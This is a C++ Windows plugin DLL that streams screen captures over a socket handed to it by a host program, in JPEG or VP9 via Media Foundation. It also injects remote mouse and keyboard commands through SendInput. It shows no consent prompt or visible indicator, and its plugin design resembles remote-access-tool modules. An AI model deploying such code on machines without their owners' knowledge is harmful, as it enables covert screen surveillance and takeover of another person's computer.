#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mftransform.h>
#include <mferror.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;
static const uint32_t MONITOR_FRAME_FORMAT_VP9 = 4;
static int g_format = MONITOR_FRAME_FORMAT_JPEG;

// --- Windows Media Foundation (WMF) DLL-less VP9 Encoder ---
static IMFTransform* g_pMftEncoder = NULL;
static DWORD g_dwInputStreamID = 0;
static DWORD g_dwOutputStreamID = 0;
static bool g_wmfInitialized = false;
static int64_t g_wmfPts = 0;
static int g_wmfWidth = 0;
static int g_wmfHeight = 0;

static const GUID OUR_MFVideoFormat_VP9 = { 0x63647076, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID OUR_MFVideoFormat_NV12 = { 0x00000015, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID OUR_CLSID_CMSVP9EncoderMFT = { 0x0a80e60b, 0x80a5, 0x48ff, { 0x9d, 0x6a, 0x54, 0x31, 0xd1, 0xd8, 0xe1, 0x32 } };

static void bgrx_to_nv12(const uint8_t* bgrx, int width, int height, uint8_t* dst_y, uint8_t* dst_uv, int stride_y, int stride_uv) {
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int src_idx = (y * width + x) * 4;
            uint8_t b = bgrx[src_idx];
            uint8_t g = bgrx[src_idx + 1];
            uint8_t r = bgrx[src_idx + 2];

            int Y = (int)(0.299 * r + 0.587 * g + 0.114 * b);
            dst_y[y * stride_y + x] = (uint8_t)(Y < 0 ? 0 : (Y > 255 ? 255 : Y));

            if ((y % 2 == 0) && (x % 2 == 0)) {
                int r_sum = 0, g_sum = 0, b_sum = 0, count = 0;
                for (int dy = 0; dy < 2; ++dy) {
                    for (int dx = 0; dx < 2; ++dx) {
                        int ny = y + dy;
                        int nx = x + dx;
                        if (ny < height && nx < width) {
                            int idx = (ny * width + nx) * 4;
                            b_sum += bgrx[idx];
                            g_sum += bgrx[idx + 1];
                            r_sum += bgrx[idx + 2];
                            count++;
                        }
                    }
                }
                int avg_b = b_sum / count;
                int avg_g = g_sum / count;
                int avg_r = r_sum / count;

                int U = (int)(-0.169 * avg_r - 0.331 * avg_g + 0.500 * avg_b + 128);
                int V = (int)(0.500 * avg_r - 0.419 * avg_g - 0.081 * avg_b + 128);

                int uv_row = y / 2;
                int uv_col = x / 2;
                dst_uv[uv_row * stride_uv + uv_col * 2]     = (uint8_t)(U < 0 ? 0 : (U > 255 ? 255 : U));
                dst_uv[uv_row * stride_uv + uv_col * 2 + 1] = (uint8_t)(V < 0 ? 0 : (V > 255 ? 255 : V));
            }
        }
    }
}

static bool init_wmf_encoder(int width, int height, int fps) {
    if (g_wmfInitialized) return true;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    hr = MFStartup(MF_VERSION);
    if (FAILED(hr)) return false;

    hr = CoCreateInstance(OUR_CLSID_CMSVP9EncoderMFT, NULL, CLSCTX_INPROC_SERVER, IID_IMFTransform, (void**)&g_pMftEncoder);
    if (FAILED(hr) || !g_pMftEncoder) {
        MFT_REGISTER_TYPE_INFO outputInfo = { MFMediaType_Video, OUR_MFVideoFormat_VP9 };
        IMFActivate** ppActivates = NULL;
        UINT32 count = 0;
        hr = MFTEnumEx(MFT_CATEGORY_VIDEO_ENCODER, MFT_ENUM_FLAG_ALL, NULL, &outputInfo, &ppActivates, &count);
        if (SUCCEEDED(hr) && count > 0) {
            hr = ppActivates[0]->ActivateObject(IID_IMFTransform, (void**)&g_pMftEncoder);
            for (UINT32 i = 0; i < count; i++) ppActivates[i]->Release();
            CoTaskMemFree(ppActivates);
        }
    }

    if (!g_pMftEncoder) {
        MFShutdown();
        CoUninitialize();
        return false;
    }

    g_dwInputStreamID = 0;
    g_dwOutputStreamID = 0;

    IMFMediaType* pOutputType = NULL;
    hr = MFCreateMediaType(&pOutputType);
    if (SUCCEEDED(hr)) {
        pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pOutputType->SetGUID(MF_MT_SUBTYPE, OUR_MFVideoFormat_VP9);
        pOutputType->SetUINT32(MF_MT_AVG_BITRATE, 1000000);
        MFSetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, width, height);
        MFSetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(pOutputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
        pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);

        hr = g_pMftEncoder->SetOutputType(g_dwOutputStreamID, pOutputType, 0);
        pOutputType->Release();
    }

    if (FAILED(hr)) {
        g_pMftEncoder->Release();
        g_pMftEncoder = NULL;
        MFShutdown();
        CoUninitialize();
        return false;
    }

    IMFMediaType* pInputType = NULL;
    hr = MFCreateMediaType(&pInputType);
    if (SUCCEEDED(hr)) {
        pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pInputType->SetGUID(MF_MT_SUBTYPE, OUR_MFVideoFormat_NV12);
        MFSetAttributeSize(pInputType, MF_MT_FRAME_SIZE, width, height);
        MFSetAttributeRatio(pInputType, MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(pInputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
        pInputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);

        hr = g_pMftEncoder->SetInputType(g_dwInputStreamID, pInputType, 0);
        pInputType->Release();
    }

    if (FAILED(hr)) {
        g_pMftEncoder->Release();
        g_pMftEncoder = NULL;
        MFShutdown();
        CoUninitialize();
        return false;
    }

    hr = g_pMftEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_FLUSH, 0);
    hr = g_pMftEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
    hr = g_pMftEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);

    g_wmfWidth = width;
    g_wmfHeight = height;
    g_wmfInitialized = true;
    return true;
}

static void cleanup_wmf_encoder() {
    if (g_wmfInitialized) {
        if (g_pMftEncoder) {
            g_pMftEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_END_OF_STREAM, 0);
            g_pMftEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);
            g_pMftEncoder->Release();
            g_pMftEncoder = NULL;
        }
        MFShutdown();
        CoUninitialize();
        g_wmfInitialized = false;
    }
    g_wmfPts = 0;
    g_wmfWidth = 0;
    g_wmfHeight = 0;
}

static bool encode_wmf_frame(const uint8_t* bgrx, int width, int height, int64_t pts, int fps, vector<uint8_t>& out_bytes) {
    if (!init_wmf_encoder(width, height, fps)) return false;

    IMFMediaBuffer* pBuffer = NULL;
    HRESULT hr = MFCreateMemoryBuffer(width * height * 3 / 2, &pBuffer);
    if (FAILED(hr)) return false;

    BYTE* pData = NULL;
    DWORD dwMaxLen = 0, dwCurrentLen = 0;
    hr = pBuffer->Lock(&pData, &dwMaxLen, &dwCurrentLen);
    if (SUCCEEDED(hr)) {
        bgrx_to_nv12(bgrx, width, height, pData, pData + (width * height), width, width);
        pBuffer->Unlock();
        pBuffer->SetCurrentLength(width * height * 3 / 2);
    }

    if (FAILED(hr)) {
        pBuffer->Release();
        return false;
    }

    IMFSample* pSample = NULL;
    hr = MFCreateSample(&pSample);
    if (SUCCEEDED(hr)) {
        pSample->AddBuffer(pBuffer);
        pSample->SetSampleTime(pts * 10000000 / fps);
        pSample->SetSampleDuration(10000000 / fps);
    }
    pBuffer->Release();

    if (FAILED(hr)) {
        if (pSample) pSample->Release();
        return false;
    }

    hr = g_pMftEncoder->ProcessInput(g_dwInputStreamID, pSample, 0);
    pSample->Release();
    if (FAILED(hr)) return false;

    MFT_OUTPUT_DATA_BUFFER outputDataBuffer{};
    outputDataBuffer.dwStreamID = g_dwOutputStreamID;

    IMFSample* pOutputSample = NULL;
    hr = MFCreateSample(&pOutputSample);
    if (FAILED(hr)) return false;

    IMFMediaBuffer* pOutputBuffer = NULL;
    hr = MFCreateMemoryBuffer(width * height * 3 / 2, &pOutputBuffer);
    if (SUCCEEDED(hr)) {
        pOutputSample->AddBuffer(pOutputBuffer);
        pOutputBuffer->Release();
    } else {
        pOutputSample->Release();
        return false;
    }

    outputDataBuffer.pSample = pOutputSample;

    DWORD dwStatus = 0;
    hr = g_pMftEncoder->ProcessOutput(0, 1, &outputDataBuffer, &dwStatus);
    if (hr == MF_E_TRANSFORM_NEED_MORE_INPUT) {
        pOutputSample->Release();
        return true;
    }

    if (SUCCEEDED(hr)) {
        IMFMediaBuffer* pMediaBuf = NULL;
        hr = outputDataBuffer.pSample->GetBufferByIndex(0, &pMediaBuf);
        if (SUCCEEDED(hr)) {
            BYTE* pOutData = NULL;
            DWORD dwLen = 0;
            hr = pMediaBuf->Lock(&pOutData, NULL, &dwLen);
            if (SUCCEEDED(hr)) {
                out_bytes.assign(pOutData, pOutData + dwLen);
                pMediaBuf->Unlock();
            }
            pMediaBuf->Release();
        }
        if (outputDataBuffer.pEvents) outputDataBuffer.pEvents->Release();
    }

    pOutputSample->Release();
    return SUCCEEDED(hr);
}

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    const vector<unsigned char>& jpegBytes,
                                    int format) {
    if (jpegBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = format;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + jpegBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static bool capture_monitor_frame(const RECT& rect,
                                  int scalePercent,
                                  vector<unsigned char>& jpegBytes,
                                  int& outputWidth,
                                  int& outputHeight,
                                  string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);
    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return false;
    }

    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
    DeleteObject(bitmap);
    return encoded;
}

static void capture_loop() {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        RECT captureRect{};
        bool hasCaptureRect = false;
        int currentFormat = MONITOR_FRAME_FORMAT_JPEG;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
            currentFormat = g_format;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        if (currentFormat == MONITOR_FRAME_FORMAT_VP9) {
            int sourceWidth = captureRect.right - captureRect.left;
            int sourceHeight = captureRect.bottom - captureRect.top;
            if (sourceWidth <= 0 || sourceHeight <= 0) {
                send_monitor_error(sock, "Invalid monitor dimensions");
                g_captureRunning.store(false);
                break;
            }

            width = max(1, (sourceWidth * scale) / 100);
            height = max(1, (sourceHeight * scale) / 100);

            // Keep dimensions even
            if (width % 2 != 0) width++;
            if (height % 2 != 0) height++;

            HDC screenDC = GetDC(NULL);
            if (!screenDC) {
                send_monitor_error(sock, "Screen DC could not be opened");
                g_captureRunning.store(false);
                break;
            }

            HDC memoryDC = CreateCompatibleDC(screenDC);
            if (!memoryDC) {
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Memory DC could not be created");
                g_captureRunning.store(false);
                break;
            }

            HBITMAP bitmap = CreateCompatibleBitmap(screenDC, width, height);
            if (!bitmap) {
                DeleteDC(memoryDC);
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Capture bitmap could not be created");
                g_captureRunning.store(false);
                break;
            }

            HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
            SetStretchBltMode(memoryDC, COLORONCOLOR);

            BOOL copied = StretchBlt(
                memoryDC,
                0,
                0,
                width,
                height,
                screenDC,
                captureRect.left,
                captureRect.top,
                sourceWidth,
                sourceHeight,
                SRCCOPY | CAPTUREBLT
            );

            SelectObject(memoryDC, oldObject);

            if (!copied) {
                DeleteObject(bitmap);
                DeleteDC(memoryDC);
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Screen capture failed");
                g_captureRunning.store(false);
                break;
            }

            BITMAPINFO bmi{};
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = BI_RGB;

            vector<uint8_t> bgrx(width * height * 4);
            GetDIBits(screenDC, bitmap, 0, height, bgrx.data(), &bmi, DIB_RGB_COLORS);

            DeleteObject(bitmap);
            DeleteDC(memoryDC);
            ReleaseDC(NULL, screenDC);

            if (!g_wmfInitialized || g_wmfWidth != width || g_wmfHeight != height) {
                cleanup_wmf_encoder();
            }

            if (encode_wmf_frame(bgrx.data(), width, height, g_wmfPts++, targetFps, frameBytes)) {
                // Frame successfully encoded
            } else {
                error = "VP9 encoding failed via Windows Media Foundation";
            }

            if (!error.empty()) {
                send_monitor_error(sock, error);
                g_captureRunning.store(false);
                break;
            }
        } else {
            if (!capture_monitor_frame(captureRect, scale, frameBytes, width, height, error)) {
                send_monitor_error(sock, error.empty() ? "Capture failed" : error);
                g_captureRunning.store(false);
                break;
            }
        }

        if (!frameBytes.empty()) {
            if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, frameBytes, currentFormat)) {
                g_captureRunning.store(false);
                break;
            }
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
    cleanup_wmf_encoder();
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps, int format) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    if (format == MONITOR_FRAME_FORMAT_VP9) {
        // Native Windows Media Foundation VP9 encoder will be initialized in capture thread
    }

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_format = format;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    // Normalized (0-65535) to Screen Absolute
    // x_abs = rect.left + (x * (rect.right - rect.left) / 65535)
    // SendInput uses MOUSEEVENTF_ABSOLUTE which maps 0-65535 to the virtual screen.

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    // Map screen coordinate to MOUSEEVENTF_ABSOLUTE (0-65535 of virtual screen)
    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            string formatStr = command.value("format", "JPEG");
            int format = MONITOR_FRAME_FORMAT_JPEG;
            if (formatStr == "VP9") {
                format = MONITOR_FRAME_FORMAT_VP9;
            }
            start_capture(sock, monitor, scale, fps, format);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

